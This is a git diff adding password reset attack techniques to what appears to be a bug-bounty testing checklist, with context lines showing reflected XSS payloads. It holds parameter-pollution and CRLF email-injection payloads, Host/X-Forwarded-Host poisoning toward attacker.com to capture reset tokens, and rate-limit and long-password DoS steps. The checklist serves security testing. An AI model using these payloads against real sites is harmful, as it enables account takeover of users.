@@ -102,6 +102,63 @@ Reflected XSS on Signup Page and Login page <br>
 &nbsp;&nbsp;&nbsp;7)Payload for Username field : <svg/onload=confirm(1)> <br>
 &nbsp;&nbsp;&nbsp;8)Payload for Email field : a7madn1@gmail.com'"><svg/onload=alert(/xss/)>, “><svg/onload=confirm(1)>”@x.y <br>
 
+PASSWORD RESET PAGE VULNERABILITIES <br>
+
+No Rate Limiting on Password Reset functionality <br>
+
+&nbsp;&nbsp;&nbsp;a)Find the reset password page on the web application. <br>
+&nbsp;&nbsp;&nbsp;b)Enter the email then click reset password <br>
+&nbsp;&nbsp;&nbsp;c)Intercept this request in burp suite.. <br>
+&nbsp;&nbsp;&nbsp;d)Send it to the intruder and repeat it 50 times. <br>
+&nbsp;&nbsp;&nbsp;e)You will get 200 OK status. <br>
+
+Account takeover by password reset functionality <br>
+
+&nbsp;&nbsp;&nbsp;email= victim@gmail.com&email=attacker@gmil.com <br>
+&nbsp;&nbsp;&nbsp;email= victim@gmail.com%20email=attacker@gmil.com <br>
+&nbsp;&nbsp;&nbsp;email= victim@gmail.com |email=attacker@gmil.com <br>
+&nbsp;&nbsp;&nbsp;email= victim@gmail.com%0d%0acc:attacker@gmil.com <br>
+&nbsp;&nbsp;&nbsp;email= victim@gmail.com&code= my password reset token <br>
+
+Denial of service when entering a long password
+
+&nbsp;&nbsp;&nbsp;Go Sign up page and Forgot password page <br>
+&nbsp;&nbsp;&nbsp;Fill the form and enter a long string in password <br>
+&nbsp;&nbsp;&nbsp;Click on enter and you’ll get 500 Internal Server errors if it is vulnerable. <br>
+&nbsp;&nbsp;&nbsp;Reference link - https://hackerone.com/reports/840598, https://hackerone.com/reports/738569 <br>
+
+Password reset token leakage via referrer <br>
+
+&nbsp;&nbsp;&nbsp;Go to the target website and request for password reset. <br>
+&nbsp;&nbsp;&nbsp;Now check your email and you will get your password reset link. <br>
+&nbsp;&nbsp;&nbsp;Click on any social media link you see in that email and password reset page. <br>
+&nbsp;&nbsp;&nbsp;Don't change the password before clicking on any external links like social media links for the same website. <br>
+&nbsp;&nbsp;&nbsp;Capture that request in burp suite, You will find a reset token in the referer header. <br>
+
+Reset password link sent over unsecured http protocol <br>
+
+&nbsp;&nbsp;&nbsp;Go to the target website and request a password reset. <br>
+&nbsp;&nbsp;&nbsp;Check email, you will get a reset password link. <br>
+&nbsp;&nbsp;&nbsp;Copy that link paste in the notepad and observe the protocol. <br>
+
+Password Reset Token Leak via X-Forwarded-Host
+
+&nbsp;&nbsp;&nbsp;Intercept the password reset request in Burp Suite <br>
+&nbsp;&nbsp;&nbsp;Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com. <br>
+&nbsp;&nbsp;&nbsp;Forward the request with the modified header. <br>
+&nbsp;&nbsp;&nbsp;Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN. <br>
+
+Password Reset Link not expiring after changing password <br>
+
+&nbsp;&nbsp;&nbsp;First You need to create an account with a Valid Email Address. <br>
+&nbsp;&nbsp;&nbsp;After Creating An Account log out from your Account and Navigate to Forgot Password Page. <br>
+&nbsp;&nbsp;&nbsp;Request a Password Reset Link for your Account. <br>
+&nbsp;&nbsp;&nbsp;Use The Password Reset Link And Change The Password, After Changing the Password Login to Your Account. <br> 
+&nbsp;&nbsp;&nbsp;Now Use The Old Password Reset Link To Change The Password Again.<br>
+&nbsp;&nbsp;&nbsp;If You Are Able to Change Your Password Again Then This Is a Bug. <br>
+
+Password Reset Link not expiring after changing the email
+
 
 
 
